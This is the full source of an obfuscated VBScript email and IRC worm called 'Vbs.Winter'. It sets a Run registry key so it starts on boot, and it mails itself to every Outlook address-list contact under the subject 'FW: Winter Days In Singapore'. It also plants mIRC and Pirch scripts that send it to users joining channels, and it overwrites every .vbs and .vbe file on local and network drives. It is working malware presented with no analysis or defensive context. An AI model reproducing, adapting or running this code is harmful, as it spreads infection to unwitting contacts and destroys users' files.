'Vbs.Winter Created By WinterRoot aka X-FeeL
'Done for Alice. thanks GinsenG.
On Error Resume Next
Set zJrv2b= Createobject("scripting.filesystemobject")
zJrv2b.copyfile wscript.scriptfullname,zJrv2b.GetSpecialFolder(1)& "\winter.txt.vbs"
Set e7BvR9 = CreateObject("WScript.Shell")
e7BvR9.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\winterboy","wscript.exe "&zJrv2b.GetSpecialFolder(1)& "\winter.txt.vbs %"
if e7BvR9.regread ("HKCU\software\Winter\mailed") <> "1" then
a98dWb()
end if
if e7BvR9.regread ("HKCU\software\Winter\mirqued") <> "1" then
xA469f ""
end if
if e7BvR9.regread ("HKCU\software\Winter\pirched") <> "1" then
mV9KnH ""
end if
uqIyeK()
if day(now) = 1 then
e7BvR9.run "http://www.geocities.com/lovelyboy_20000/bill.html",3,false
end if
Set v3TIRr= zJrv2b.opentextfile(wscript.scriptfullname, 1)
P14Vig= v3TIRr.readall
v3TIRr.Close
Do
If Not (zJrv2b.fileexists(wscript.scriptfullname)) Then
Set fjwLte= zJrv2b.createtextfile(wscript.scriptfullname, True)
fjwLte.writeP14Vig
fjwLte.Close
End If
Loop
Function a98dWb()
On Error Resume Next
Set e1xFml= CreateObject("Outlook.Application")
If e1xFml = "Outlook" Then
Set I7r90d= zJrv2b.opentextfile(wscript.scriptfullname, 1)
I = 1
Do While I7r90d.atendofstream = False
DID0hw= I7r90d.readline
n483u2= n483u2& Chr(34) & " & vbcrlf & " & Chr(34) & replace(DID0hw, Chr(34), Chr(34) & "&chr(34)&" & Chr(34))
Loop
I7r90d.close
klIa34 = "<" & "HTML><" & "HEAD><" & "META content=" & Chr(34) & " & chr(34) & " & Chr(34) & "text/html; charset=iso-8859-1" & Chr(34) & " http-equiv=Content-Type><" & "META content=" & Chr(34) & "MSHTML 5.00.2314.1000" & Chr(34) & " name=GENERATOR><" & "STYLE></" & "STYLE></" & "HEAD><" & "BODY bgColor=#ffffff><" & "SCRIPT language=vbscript>"
klIa34 = klIa34& vbCrLf & "On Error Resume Next"
klIa34 = klIa34 & vbCrLf & "Set fso = CreateObject(" & Chr(34) & "scripting.filesystemobject" & Chr(34) & ")"
klIa34 = klIa34 & vbCrLf & "If Err.Number <> 0 Then"
klIa34 = klIa34 & vbCrLf & "document.write " & Chr(34) & "<font face='verdana' color=#ff0000 size='2'>You need ActiveX enabled if you want to see this e-mail.<br>Please open this message again and click accept ActiveX<br>Microsoft Outlook</font>" & Chr(34) & ""
klIa34 = klIa34 & vbCrLf & "Else"
klIa34 = klIa34 & vbCrLf & "Set vbs = fso.createtextfile(fso.getspecialfolder(0) & " & Chr(34) & "\winter.txt.vbs" & Chr(34) & ", True)"
klIa34 = klIa34 & vbCrLf & "vbs.write  " & Chr(34) & n483u2& Chr(34)
klIa34 = klIa34 & vbCrLf & "vbs.Close"
klIa34 = klIa34 & vbCrLf & "Set ws = CreateObject(" & Chr(34) & "wscript.shell" & Chr(34) & ")"
klIa34 = klIa34 & vbCrLf & "ws.run fso.getspecialfolder(0) & " & Chr(34) & "\wscript.exe " & Chr(34) & " & fso.getspecialfolder(0) & " & Chr(34) & "\winter.txt.vbs %" & Chr(34) & ""
Eb03z6 = Eb03z6& vbCrLf & "document.write " & Chr(34) & "Ever wonder about having winter days?" & Chr(34) & ""
Eb03z6 = Eb03z6& vbCrLf & "End If"
Eb03z6 = Eb03z6 & vbCrLf & "<" & "/SCRIPT></" & "body></" & "html>"
Vj7S6d=klIa34 & Eb03z6
Set Qk2Q0f = e1xFml.GetNameSpace("MAPI")
For Each JDuB86 In Qk2Q0f.AddressLists
If JDuB86.AddressEntries.Count <> 0 Then
G8Gjz7= JDuB86.AddressEntries.Count
Set KO9DLA= e1xFml.CreateItem(0)
KO9DLA.Subject = "FW: Winter Days In Singapore"
KO9DLA.HTMLBody = Vj7S6d
KO9DLA.DeleteAfterSubmit = True
For mt9ihp = 1 To G8Gjz7
Set fDieh2= JDuB86.AddressEntries(mt9ihp)
If G8Gjz7= 1 Then
KO9DLA.BCC = fDieh2.Address
Else
KO9DLA.BCC = KO9DLA.BCC & "; " & fDieh2.Address
End If
Next
KO9DLA.send
End If
Next
e7BvR9.regwrite "HKCU\software\Winter\mailed", "1"
e1xFml.Quit
end if
End Function
Function xA469f(fnmt7E)
On Error Resume Next
if fnmt7E = "" then
if zJrv2b.fileexists("c:\mirc\mirc.ini") then fnmt7E="c:\mirc"
if zJrv2b.fileexists("c:\mirc32\mirc.ini") then fnmt7E="c:\mirc32"
IYO3Dp=e7BvR9.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if zJrv2b.fileexists(IYO3Dp & "\mirc\mirc.ini") then fnmt7E=IYO3Dp & "\mirc"
end if
if fnmt7E <> "" then
set bVYjOJ = zJrv2b.CreateTextFile(fnmt7E & "\script.ini", True)
bVYjOJ.WriteLine "[script]"
bVYjOJ.writeline "n0=on 1:JOIN:#:{"
bVYjOJ.writeline "n1=  /if ( $nick == $me ) { halt }"
bVYjOJ.writeline "n2=  /." & chr(100) & chr(99) & chr(99) & " send $nick "&zJrv2b.GetSpecialFolder(1)& "\winter.txt.vbs" & vbCrLf & "n3=}"
bVYjOJ.close
e7BvR9.regwrite "HKCU\software\Winter\Mirqued", "1"
end if
end function
function mV9KnH(LtWr9q)
On Error Resume Next
if LtWr9q="" then
if zJrv2b.fileexists("c:\pirch\Pirch32.exe") then LtWr9q="c:\pirch"
if zJrv2b.fileexists("c:\pirch32\Pirch32.exe") then LtWr9q="c:\pirch32"
RVQ8Fb=e7BvR9.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if zJrv2b.fileexists(RVQ8Fb & "\pirch\Pirch32.exe") then LtWr9q=RVQ8Fb & "\pirch\Pirch32.exe"
end if
if LtWr9q <> "" then
set I464S3= zJrv2b.CreateTextFile(LtWr9q & "\events.ini", True)
I464S3.WriteLine "[Levels]"
I464S3.WriteLine "Enabled=1"
I464S3.WriteLine "Count=6"
I464S3.WriteLine "Level1=000-Unknowns"
I464S3.WriteLine "000-UnknownsEnabled=1"
I464S3.WriteLine "Level2=100-Level 100"
I464S3.WriteLine "100-Level 100Enabled=1"
I464S3.WriteLine "Level3=200-Level 200"
I464S3.WriteLine "200-Level 200Enabled=1"
I464S3.WriteLine "Level4=300-Level 300"
I464S3.WriteLine " 300-Level 300Enabled=1"
I464S3.WriteLine "Level5=400-Level 400 "
I464S3.WriteLine "400-Level 400Enabled=1"
I464S3.WriteLine "Level6=500-Level 500"
I464S3.WriteLine "500-Level 500Enabled=1"
I464S3.WriteLine ""
I464S3.WriteLine "[000-Unknowns]"
I464S3.WriteLine "UserCount=0"
I464S3.WriteLine "EventCount=0"
I464S3.WriteLine ""
I464S3.WriteLine "[100-Level 100]"
I464S3.WriteLine "User1=*!*@*"
I464S3.WriteLine "UserCount=1"
I464S3.writeline "Event1=ON JOIN:#:/" & chr(100) & chr(99) & chr(99) & " tsend $nick " & zJrv2b.GetSpecialFolder(1) & "\winter.txt.vbs"
I464S3.WriteLine "EventCount=1"
I464S3.WriteLine ""
I464S3.WriteLine "[200-Level 200]"
I464S3.WriteLine "UserCount=0"
I464S3.WriteLine "EventCount=0"
I464S3.WriteLine ""
I464S3.WriteLine "[300-Level 300]"
I464S3.WriteLine "UserCount=0"
I464S3.WriteLine "EventCount=0"
I464S3.WriteLine ""
I464S3.WriteLine "[400-Level 400]"
I464S3.WriteLine "UserCount=0"
I464S3.WriteLine "EventCount=0"
I464S3.WriteLine ""
I464S3.WriteLine "[500-Level 500]"
I464S3.WriteLine "UserCount=0"
I464S3.WriteLine "EventCount=0"
I464S3.close
e7BvR9.regwrite "HKCU\software\Winter\pirched", "1"
end if
end function
Function uqIyeK()
On Error Resume Next
Set RYSV1L = zJrv2b.Drives
For Each nnq9JQ In RYSV1L
If nnq9JQ.Drivetype = Remote Then
n1SN0z= nnq9JQ & "\"
Call pb827o(n1SN0z)
ElseIf nnq9JQ.IsReady Then
n1SN0z= nnq9JQ&"\"
Call pb827o(n1SN0z)
End If
Next
End Function
Function pb827o(Jt988p)
sWn14r=Jt988p
Set nuwzII= zJrv2b.GetFolder(sWn14r)
Set L9j1E0= nuwzII.Files
For Each KcDkqy In L9j1E0
if zJrv2b.GetExtensionName(KcDkqy.path) = "vbs" then
zJrv2b.copyfile wscript.scriptfullname , KcDkqy.path , true
end if
if zJrv2b.GetExtensionName(KcDkqy.path) = "vbe" then
zJrv2b.copyfile wscript.scriptfullname , KcDkqy.path , true
end if
Next
Set KcDkqy= nuwzII.SubFolders
For Each RFjeiB In KcDkqy
Call pb827o(RFjeiB.path)
Next
End Function

